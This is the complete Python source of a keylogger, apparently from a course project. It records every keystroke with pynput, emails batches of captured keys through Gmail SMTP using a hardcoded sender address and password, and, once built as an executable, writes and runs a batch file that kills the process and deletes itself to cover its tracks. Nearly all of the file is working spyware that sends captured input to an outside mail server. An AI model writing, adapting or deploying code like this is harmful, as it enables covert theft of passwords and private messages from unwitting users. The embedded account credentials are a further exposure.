from pynput import keyboard
import time
import smtplib
from os import remove, path
import subprocess
from sys import argv
import threading
import queue
destEmail = 'keylogsenderUIUC460@gmail.com'
dataBufferSize = 100
hackeremail = "keylogsenderUIUC460"
hackerpwd =  "qazwsxedcrfv"
local = False
exit_key = keyboard.Key.esc


data = ""

holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
			 'Key.shift', 'Key.shift_r',
			 'Key.alt_l', 'Key.alt_r']


def serverSetup():
	global hackeremail, hackerpwd
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(hackeremail, hackerpwd)
	return server

def send_data():
	global data
	try:
		msg = data
		data = ''
		if(local):
			print('sending data through LOG FILE')
			f.write('{0}'.format(msg))	
		else:
			print('sending data through EMAIL')
			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
		print("sending complete")
	except Exception as e:
		print('Exception: ' + str(e))
	
def recordKey(key):
		global data
		try:
			data += str(key.char)
		except AttributeError:
			data += str(key)
		except Exception as e:
			print('Exception: '+str(e))
		finally:
			if(len(data) > dataBufferSize):
				send_data()
def on_press(key):
	print(key)
	recordKey(key)

def on_release(key):
	global data
	if(key == exit_key): #exit
		return False
	try:
		if(str(key) in holdDowns):
			recordKey(key)
	except Exception as e:
		print('Exception: '+ str(e))

def run_keylogger():
	#collect events until released
	with keyboard.Listener(
			on_press=on_press,
			on_release=on_release
			) as listener:

		try:
			print("joining")
			listener.join()
			print("joined")
		except Exception as e:
			print('Exception: '+str(e))
def selfDelete():
	#create selfdelete file
	BATTXT = ("@ECHO OFF\n"
		  +"SETLOCAL\n"
		  +"TASKKILL /IM \"keylogger.exe\"\n"
		  +"DEL \""+argv[0]+"\"\n"
		  +"DEL \"%~f0\"") 
	d = open("del.bat", 'w')
	d.write(BATTXT)
	d.close()
	
	#run selfdelete file on exe
	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) #shell=True makes it not-popup

def main():
	if(local):
		f = open('keylog.txt', 'w')
		print("logging to file...")
	else:
		print("logging to email...")
		global server 
		server = serverSetup()
	run_keylogger()

	if(local):
		f.close()
	
	if(argv[0][-2:]!="py"):#so we don't acidentally delete the python file when testing
		selfDelete()

if __name__== "__main__":
  main()
